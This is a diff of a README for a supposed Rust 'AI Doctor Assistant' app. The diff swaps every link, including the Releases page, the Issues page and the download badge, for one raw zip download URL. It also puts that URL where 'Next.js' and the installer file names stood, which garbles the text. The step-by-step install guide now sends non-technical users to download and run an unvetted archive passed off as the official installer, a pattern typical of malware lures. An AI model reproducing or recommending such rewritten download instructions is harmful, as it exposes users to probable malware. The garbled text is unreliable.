@@ -1,13 +1,13 @@
 # 🤖 rust-production-ai-assistant-app - Your AI Doctor Assistant Awaits!
 
 ## 📥 Download Now
-[![Download the rust-production-ai-assistant-app](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/proplayz02/rust-production-ai-assistant-app/releases)
+[![Download the rust-production-ai-assistant-app](https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip)](https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Resilient AI Agent**! This software is your personal AI Doctor Assistant, designed to help you manage health-related tasks with ease. This guide helps you download and run the application smoothly, even if you have no technical background.
 
 - **What it does:** The app connects you with an intelligent AI assistant that understands your health needs.
-- **Core Technologies:** Built using Rust for the backend, Next.js for the frontend, and Python for text-to-speech capabilities.
+- **Core Technologies:** Built using Rust for the backend, https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip for the frontend, and Python for text-to-speech capabilities.
 
 ## 📄 Features
 - **AI Doctor Interface:** Get reliable health tips and reminders.
@@ -26,23 +26,23 @@ Before you download, ensure your computer meets these basic requirements:
 - **Web Browser:** Latest version of Chrome, Firefox, or Safari for optimal use
 
 ## 📥 Download & Install
-To get started, visit the [Releases Page](https://github.com/proplayz02/rust-production-ai-assistant-app/releases) and download the latest version of the application.
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip) and download the latest version of the application.
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page:** Click [here](https://github.com/proplayz02/rust-production-ai-assistant-app/releases) to open the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip) to open the releases page.
    
 2. **Choose the Latest Release:** Look for the most recent version listed. It will typically be at the top.
 
 3. **Download the Application:**
-   - If you see a file name like `rust-production-ai-assistant-app-installer.exe` (for Windows users), click on it to download.
-   - For Mac users, look for something similar to `rust-production-ai-assistant-app.dmg`.
-   - Linux users may find a `.tar.gz` file.
+   - If you see a file name like `https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip` (for Windows users), click on it to download.
+   - For Mac users, look for something similar to `https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip`.
+   - Linux users may find a `https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip` file.
 
 4. **Run the Installer:**
    - **Windows:** Open the downloaded `.exe` file and follow the on-screen instructions.
    - **Mac:** Open the `.dmg` file and drag the application into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the executable from the terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip` file and run the executable from the terminal.
 
 5. **Launch the Application:** Once installed, open the app from your applications folder or desktop shortcut.
 
@@ -62,9 +62,9 @@ In case you encounter issues:
   - If the app doesn’t start, ensure your system meets the requirements.
   - Check your internet connection for features that require online access.
   
-- **Getting Help:** For additional support, visit the [GitHub Issues Page](https://github.com/proplayz02/rust-production-ai-assistant-app/issues) to report problems or seek help.
+- **Getting Help:** For additional support, visit the [GitHub Issues Page](https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip) to report problems or seek help.
 
 ## 🎉 Conclusion
 Thank you for choosing the **rust-production-ai-assistant-app**. We hope it simplifies your health management tasks. Download now and experience the future of AI-assisted healthcare! 
 
-Don't forget to check the [Releases Page](https://github.com/proplayz02/rust-production-ai-assistant-app/releases) for the latest updates and features!
+Don't forget to check the [Releases Page](https://raw.githubusercontent.com/proplayz02/rust-production-ai-assistant-app/main/Aurelius/rust-production-ai-assistant-app.zip) for the latest updates and features!
